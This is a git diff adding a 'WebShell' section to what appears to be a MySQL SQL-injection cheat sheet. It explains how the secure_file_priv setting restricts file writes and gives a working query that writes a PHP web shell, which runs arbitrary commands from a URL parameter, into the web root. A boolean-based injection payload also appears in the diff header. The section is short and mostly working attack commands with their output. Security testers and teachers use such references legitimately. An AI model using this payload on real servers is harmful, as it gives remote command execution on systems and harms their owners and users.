@@ -242,3 +242,34 @@ SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' A
 
 </code></pre>
 
+## # WebShell
+
+If --secure-file-priv option is set, it is difficult to execute the webshell. Because we can only generate a file in /var/lib/mysql-files.
+
+```sql
+mysql> SELECT @@GLOBAL.secure_file_priv;
++---------------------------+
+| @@GLOBAL.secure_file_priv |
++---------------------------+
+| /var/lib/mysql-files/     |
++---------------------------+
+1 row in set (0.00 sec)
+```
+
+If --secure-file-priv is set as /var and an account has write permission in the directory, we can attempt a webshell upload.
+
+```sql
+mysql> SELECT @@GLOBAL.secure_file_priv;
++---------------------------+
+| @@GLOBAL.secure_file_priv |
++---------------------------+
+| /var/                     |
++---------------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/html/webshell.php";
+Query OK, 1 row affected (0.00 sec)
+```
+
+
+
